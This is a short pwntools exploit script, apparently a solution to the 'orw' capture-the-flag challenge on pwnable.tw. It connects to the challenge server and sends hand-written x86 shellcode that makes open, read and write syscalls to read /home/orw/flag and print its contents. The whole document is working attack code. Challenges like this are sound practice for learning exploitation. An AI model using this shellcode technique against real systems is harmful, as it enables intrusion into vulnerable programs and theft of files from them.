#!python3
from pwn import *
# connect chall.pwnable.tw 10001
#context.log_level = 'debug'
r = remote('chall.pwnable.tw', 10001)
# r = process('./orw')

# write shellcode to Read the flag from /home/orw/flag
shellcode = asm('\n'.join([
    'push %d' % u32('ag\0\0'),
    'push %d' % u32('w/fl'),
    'push %d' % u32('e/or'),
    'push %d' % u32('/hom'),
    'xor ecx, ecx',
    'xor edx, edx',
    'mov ebx, esp',
    'mov eax, 0x5',
    'int 0x80',
    'mov ebx, eax',
    'mov ecx, esi',
    'mov edx, 0x100',
    'mov eax, 0x3',
    'int 0x80',
    'mov ebx, 0x1',
    'mov ecx, esi',
    'mov edx, eax',
    'mov eax, 0x4',
    'int 0x80',
]))
r.sendline(shellcode)
print(r.recvall())
r.close()